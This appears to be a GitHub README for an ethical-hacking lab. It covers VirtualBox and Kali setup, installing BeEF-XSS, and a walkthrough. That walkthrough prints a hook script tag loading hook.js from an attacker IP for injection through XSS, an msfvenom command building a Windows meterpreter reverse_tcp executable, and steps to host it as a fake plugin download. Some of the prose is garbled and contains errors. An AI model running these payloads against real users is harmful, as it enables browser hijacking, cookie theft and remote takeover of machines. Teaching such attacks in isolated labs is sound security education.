# BeEF-XSS – Ethical Hacking & Browser Exploitation Lab

This project demonstrates how to use the **Browser Exploitation Framework (BeEF)** with **Cross-Site Scripting (XSS)** vulnerabilities to simulate client-side attacks in a controlled, ethical hacking environment.

> ⚠️ **Disclaimer**: This lab is intended for educational and authorized penetration testing purposes only. Do not use these techniques on systems you do not own or have explicit permission to test.

---




## Chapter 1: Setting Up the Virtual Lab




We create a safe, isolated environment for ethical hacking and browser exploitation:

### Required Virtual Machines
<img width="549" height="349" alt="image" src="https://github.com/user-attachments/assets/ce35c266-ce54-4c0c-b6c4-544b86705de9" />

- **Kali Linux** (Attacker Machine)
- **Ubuntu Desktop VMs** (Victim Machines)
- **Metasploitable2** (Vulnerable Linux Server)

### Tool: VirtualBox

VirtualBox is a free and open-source virtualization tool to run our VMs.

1. Download from [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)
2. Install and create virtual machines with proper specs.
3. Configure **networking**: Use "Internal Network" for isolated attack scenarios.

<img width="1603" height="1022" alt="Screenshot 2025-09-04 183406" src="https://github.com/user-attachments/assets/f11cd28a-cc7a-4c34-bebe-6b436619d42d" />

---

## Chapter 2: Installing Kali Linux
Select Graphical Install.
Choose language, keyboard, timezone.
When asked for partitioning, select:
Use largest free space (recommended).
Or manual partitioning (if advanced).
Install GRUB bootloader to main disk (important for dual boot).
Reboot
You’ll now see GRUB Boot Menu:
Select Kali Linux or Windows each time you boot.

### Setting Up Kali Linux 

Kali Linux is a Linux distribution that contains a collection of penetration testing tools. We’ll use the Kali virtual machine to hack into the other machines on our virtual network. Download the Kali Linux VirtualBox image from https://www.offensive-security.com/kali-linux-vm-vmware-virtualboximage-download/. Ensure that the files listed are Kali Linux VirtualBox images and not VMWare images, and select the VirtualBox image version that is suitable for your system (64-bit or 32-bit). Add the Kali machine to VirtualBox by right-clicking the downloaded OVA file and opening it using VirtualBox. You should be prompted with a screen containing the preconfigured settings for the machine. On the left side of the page, you should see a folder icon. Click it and select your downloaded OVA file.NOTE 
Ensure that your virtual machine is turned off before adjusting the network settings. To configure network settings, right-click the Kali virtual machine from the list of machines on the left and then select Settings. Click the Network tab and then click Adapter 1. Select the Enable Network Adapter checkbox and set Attached to from the drop-down menu to Internal Network. Leave the name as “Internal LAN” and click OK. Open the Kali Linux virtual machine in VirtualBox. If your Kali Linux displays nothing but a black screen, make sure the PAE/NK checkbox is selected in Settings.

### Dual Boot (Windows + Kali Linux)

- Use **Rufus** to create bootable USB.
- Shrink Windows partition (30–50GB).
- Install Kali from USB.
- Setup GRUB bootloader to dual boot between Windows and Kali.

### VirtualBox (Recommended)

1. Download Kali VirtualBox image from [https://www.kali.org](https://www.kali.org)
2. Import `.ova` file into VirtualBox.
3. Set **network to Internal Network**.
4. Boot up Kali Linux VM.
## Install Guest Additions (Optional but Recommended)
From VirtualBox menu: Devices → Insert Guest Additions CD Image.
This enables full screen, shared clipboard, drag & drop.
 
```bash
deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware
deb http://http.kali.org/kali kali-last-snapshot main contrib non-free non-free-firmware
deb http://http.kali.org/kali kali-experimental main contrib non-free non-free-firmware
deb http://http.kali.org/kali kali-bleeding-edge main contrib non-free non-free-firmware
deb-src http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware
```
<img width="1548" height="1016" alt="Screenshot 2025-09-04 184042" src="https://github.com/user-attachments/assets/b2a14f99-8acc-40ba-80e3-9002b5fa5851" />

> Fix sources with:
```bash
sudo nano /etc/apt/sources.list
```
### Add:

deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware
```bash
sudo apt update && sudo apt full-upgrade -y
```

# Chapter 3: BeEF-XSS – Complete Guide

## What is BeEF?
BeEF (**Browser Exploitation Framework**) is a penetration testing tool that focuses on **client-side attacks** via web browsers.

**XSS (Cross-Site Scripting)** allows attackers to inject malicious scripts into web pages.

---

## Why Use BeEF-XSS?
- Demonstrates **real-world XSS attack scenarios**  
- Helps understand **browser exploitation & social engineering**  
- Shows **why front-end security matters**  

---

## ⚙️ Installing BeEF on Kali Linux

### Step 1: Check if Install
```bash
beef-xss
```
If it starts : you’re good! Jump to “Running BeEF”.
If command not found, install it.
Install it from the kali repository:
Use /root command  in command prompt/Terminal 
```bash
$ Sudo su
```
Or open root command prompt/Terminal 
After to use the installation command 
<img width="692" height="276" alt="image" src="https://github.com/user-attachments/assets/73dd5bbd-6675-4380-b9d2-e32f62df9f30" />

```bash
$ Sudo apt install beef-xss -y
```
This installs the latest stable version of BeEF on Kali Linux.

<img width="1324" height="712" alt="Screenshot 2025-09-04 184325" src="https://github.com/user-attachments/assets/70847c50-60ff-4c99-a644-a10a563e2d42" />

If not found, install it:
```bash
sudo apt update && sudo apt install beef-xss -y
```
### Step 2: Change Default Credentials
```bash
sudo nano /etc/beef-xss/config.yaml
# Change username and password here
```


### Step 3: Start BeEF
```bash
sudo service beef-xss start
```

Open in browser:
http://localhost:3000/ui/panel

Default credentials:
Running BeEF-XSS
 To change the password to BeEF-XSS. To enter the command and change because of to secured the BeEF and also prepare for the attacks.
<img width="692" height="389" alt="image" src="https://github.com/user-attachments/assets/9e6540e9-9d23-421d-976a-512bd15c287b" />
 
```bash

$ nano /etc/beef-xss/config.yaml

Username: beef  
Password: beef
```

<img width="1542" height="1020" alt="Screenshot 2025-09-04 184403" src="https://github.com/user-attachments/assets/08a7624b-6b1a-4dd1-96b0-90554293d4e1" />

## Hooking a Browser

<img width="1598" height="1018" alt="Screenshot 2025-09-05 102448" src="https://github.com/user-attachments/assets/10a6109a-4f97-4964-9c6f-82a54fa45233" />
<img width="1068" height="811" alt="Screenshot 2025-09-05 102733" src="https://github.com/user-attachments/assets/190e4ff4-db78-48a3-af92-2b54be6c79e3" />
<img width="1059" height="610" alt="Screenshot 2025-09-05 103440" src="https://github.com/user-attachments/assets/b7d7805d-5623-41eb-a334-fe710a9bba2e" />
After to complete the changing the password to check the status and start the BeEF-XSS . 
Wait a few seconds. Once running
To check the “localhost”. Because of the local_host was the main lead of the BeEF-XSS browser.
```bash
$ nmap localhost
```
If the command show the open tcp “3000”. to the use the 3000 to open the BeEF-XSS browser.
## How BeEF-XSS Works - Step by Step 
Open fire fox to enter the localhost:3000  to show the Apache 2 Test page. To study the BeEF-XSS browser. And to open the BeEF-XSS to practices ethical hacking and
penetration Testing  localhost:3000/ui/panel and listens for incoming browser connectins.
To know the ip-configaration it’s most important to use the attacking and defence the attackers. 
```bash
$ ifconfig
```
<img width="426" height="204" alt="image" src="https://github.com/user-attachments/assets/72e7e0ae-6516-491a-9105-addf47fa55e3" />


Once a victim browser loads the hook script (e.g., from an XSS payload), it connects to BeEF-XSS  and appears in the online browsers list in your control panel.
From there, you can:
Run social engineering attacks
Collect cookies
Perform internal network scans
Launch brwser exploits
All from the BeEF GUI.
Generate the Hook URL
BeEF gives a javaScript payload like:
Inject this payload via an XSS vulnerability:
```bash
<script src="http://<attacker-ip>:3000/hook.js"></script>
```
The script must be injected into a vulnerable web page, which is typically done via XSS.
Exploit XSS Vulnerability
        The attacker finds an XSS Vulnerability on a target website.
        They inject the BeEF hook script using XSS.
Example :
<script src=“http://192.162.1.100:3000/hook.js”></script>
When a victim visits the infected page, their browser loads the script from the attacker’s server
Hook the Browser
Once the script runs, the victim’s browser connects to the BeEF server.
The victim is now “hooked”
The attacker sees the victim’s browser in the BeEF UI.

Once executed, the victim’s browser connects to BeEF and appears in the control panel.

From there, you can:

Steal cookies

Create fake login prompts

Scan internal networks

Launch social engineering attacks

# Sample Payload with Metasploit (msfvenom)
### Step 1: Create Payload

<img width="954" height="1014" alt="Screenshot 2025-09-13 125820" src="https://github.com/user-attachments/assets/fd9fddc0-3733-4136-9374-d7eb4fa83c2b" />
<img width="949" height="516" alt="Screenshot 2025-09-13 130038" src="https://github.com/user-attachments/assets/6c6d63e8-cda0-4b4b-bef0-bdd04135f959" />
To create a fake text file or exe file by insert the malware to the system.
To Open the command prompt and to give the commands like:

```bash
cd /home/kali/Desktop
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -f exe > payload.exe
```
To give the commands by the target.
Module Tree was help attacker to attack the target.
If you execute the commands to show the target message like “install missing plugging” if target Download the file attacker war get permeation to access the network.an steel the Data from the system.
To get personal Data form the target by using the applications, commands for the ethical hacking and penetration testing. To open the command prompt and to hook the browser.
### Step 2: Host the Payload
```bash
mv payload.exe /var/www/html/
```

Send the link using BeEF’s social engineering modules.
